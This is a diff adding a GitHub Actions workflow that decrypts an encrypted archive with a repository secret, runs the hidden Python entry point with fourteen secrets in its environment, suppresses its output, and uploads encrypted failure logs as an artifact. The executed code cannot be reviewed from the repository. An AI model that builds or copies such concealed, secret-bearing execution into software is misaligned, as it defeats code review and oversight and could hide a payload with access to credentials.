@@ -1,0 +1,94 @@
+name: b
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+concurrency:
+  group: b
+  cancel-in-progress: false
+
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.13"
+
+      - name: prep
+        run: |
+          python -m pip install --upgrade pip >/dev/null 2>&1
+          python -m pip install cryptography >/dev/null 2>&1
+
+      - name: build
+        shell: bash
+        run: |
+          set +e
+          python - <<'PY'
+          import base64, io, os, sys, zipfile
+          from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+          try:
+              raw = open("data/b.bin", "rb").read()
+              key = base64.urlsafe_b64decode(os.environ["K"].encode())
+              out = AESGCM(key).decrypt(raw[:12], raw[12:], None)
+              zipfile.ZipFile(io.BytesIO(out)).extractall(".run")
+          except BaseException:
+              sys.exit(1)
+          PY
+          code=$?
+          if [ "$code" -ne 0 ]; then
+            echo "x"
+          fi
+          exit "$code"
+        env:
+          K: ${{ secrets.KEY_B }}
+
+      - name: deps
+        run: python -m pip install -r .run/requirements.txt >/dev/null 2>&1
+
+      - name: run
+        shell: bash
+        run: |
+          set +e
+          python .run/entry.py > .run/out.log 2>&1
+          code=$?
+          if [ "$code" -eq 0 ]; then
+            echo "ok"
+          else
+            python -c 'import base64, os; from cryptography.hazmat.primitives.ciphers.aead import AESGCM; key=base64.urlsafe_b64decode(os.environ["K"].encode()); data=open(".run/out.log","rb").read(); nonce=os.urandom(12); open(".run/x.bin","wb").write(nonce + AESGCM(key).encrypt(nonce, data, None))' >/dev/null 2>&1
+            echo "x"
+          fi
+          exit "$code"
+        env:
+          K: ${{ secrets.KEY_B }}
+          RUN_ONCE: "true"
+          CFG_01: ${{ secrets.CFG_01 }}
+          CFG_02: ${{ secrets.CFG_02 }}
+          CFG_03: ${{ secrets.CFG_03 }}
+          CFG_04: ${{ secrets.CFG_04 }}
+          CFG_05: ${{ secrets.CFG_05 }}
+          CFG_06: ${{ secrets.CFG_06 }}
+          CFG_07: ${{ secrets.CFG_07 }}
+          CFG_08: ${{ secrets.CFG_08 }}
+          CFG_09: ${{ secrets.CFG_09 }}
+          CFG_10: ${{ secrets.CFG_10 }}
+          CFG_11: ${{ secrets.CFG_11 }}
+          CFG_12: ${{ secrets.CFG_12 }}
+          CFG_13: ${{ secrets.CFG_13 }}
+          CFG_14: ${{ secrets.CFG_14 }}
+
+      - name: save
+        if: ${{ !success() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: x-b
+          path: .run/x.bin
+          if-no-files-found: ignore
